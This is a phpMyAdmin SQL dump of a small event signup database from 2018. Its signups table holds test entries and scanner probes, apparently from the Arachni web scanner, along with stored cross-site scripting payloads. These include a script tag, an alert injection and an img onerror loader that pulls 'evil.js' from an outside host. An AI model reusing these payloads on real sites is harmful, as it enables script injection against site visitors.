-- phpMyAdmin SQL Dump
-- version 4.1.14.8
-- http://www.phpmyadmin.net
--
-- Host: db756533998.db.1and1.com
-- Generation Time: Oct 07, 2018 at 07:39 PM
-- Server version: 5.5.60-0+deb7u1-log
-- PHP Version: 5.4.45-0+deb7u14

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `db756533998`
--
CREATE DATABASE IF NOT EXISTS `db756533998` DEFAULT CHARACTER SET latin1 COLLATE latin1_general_ci;
USE `db756533998`;

-- --------------------------------------------------------

--
-- Table structure for table `events`
--

CREATE TABLE IF NOT EXISTS `events` (
  `eventId` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `name` tinytext COLLATE utf16_unicode_ci,
  `date` date DEFAULT NULL,
  `startTime` time DEFAULT NULL,
  `endTime` time DEFAULT NULL,
  `address` text COLLATE utf16_unicode_ci,
  `eventCoordinator` text COLLATE utf16_unicode_ci,
  `maxSlots` tinyint(4) NOT NULL DEFAULT '10',
  PRIMARY KEY (`eventId`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf16 COLLATE=utf16_unicode_ci AUTO_INCREMENT=8 ;

--
-- Dumping data for table `events`
--

INSERT INTO `events` (`eventId`, `name`, `date`, `startTime`, `endTime`, `address`, `eventCoordinator`, `maxSlots`) VALUES
(1, 'BMMS Winter Concert CHANGE', '2018-11-29', '18:31:00', '21:29:00', 'Andrew testing changing here\r\n', 'arachni_name', 20),
(2, 'Ecksdee', '2018-04-04', '00:28:00', '00:22:00', 'CHS', 'Hi there Andrew testing', 15),
(5, NULL, NULL, NULL, NULL, NULL, NULL, 10),
(6, 'Funky Boi', '2018-10-07', '19:58:00', '19:58:00', '', '', 10),
(7, NULL, NULL, NULL, NULL, NULL, NULL, 10);

-- --------------------------------------------------------

--
-- Table structure for table `signups`
--

CREATE TABLE IF NOT EXISTS `signups` (
  `signupId` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `eventId` smallint(5) unsigned NOT NULL,
  `name` tinytext COLLATE utf16_unicode_ci NOT NULL,
  PRIMARY KEY (`signupId`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf16 COLLATE=utf16_unicode_ci AUTO_INCREMENT=70 ;

--
-- Dumping data for table `signups`
--

INSERT INTO `signups` (`signupId`, `eventId`, `name`) VALUES
(31, 1, 'Andrew Zhao'),
(33, 1, 'Malika Shah'),
(38, 1, 'Another Tester CHANGE'),
(40, 1, ''),
(41, 1, 'arachni_name''"'),
(42, 1, ''),
(43, 1, 'arachni_name'),
(44, 1, 'arachni_name]]]]]]]]]'),
(45, 1, 'arachni_name<!--'),
(46, 1, '_arachni_trainer_c2bbf7272a117e6dd14113422db4f2ac'),
(47, 1, 'arachni_name_arachni_trainer_c2bbf7272a117e6dd14113422db4f2ac'),
(48, 1, '_arachni_trainer_c2bbf7272a117e6dd14113422db4f2ac\0'),
(49, 1, 'arachni_name_arachni_trainer_c2bbf7272a117e6dd14113422db4f2ac\0'),
(50, 1, 'arachni_name<xss_c2bbf7272a117e6dd14113422db4f2ac/>'),
(51, 1, 'arachni_name%3Cxss_c2bbf7272a117e6dd14113422db4f2ac%2F%3E'),
(53, 2, 'Who dis'),
(54, 1, ''),
(55, 1, ''),
(56, 1, ''),
(57, 1, ''),
(58, 1, ''),
(59, 2, '<script src=https://phosphorus.github.io/embed.js?id=236562889&auto-start=true&light-content=false></script>'),
(60, 5, '<img src=1 onerror="s=document.createElement(''script'');s.src=''//xss-doc.appspot.com/static/evil.js'';document.body.appendChild(s'),
(61, 5, 'DAasasdS'),
(62, 5, 'test'),
(63, 7, 'test'),
(64, 7, 't'),
(65, 6, 'test1'),
(66, 6, 'test1'),
(67, 7, '<script>alert("XSS Injection");</script>'),
(68, 5, 'Tester Person'),
(69, 5, 'Andrew Zhao');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
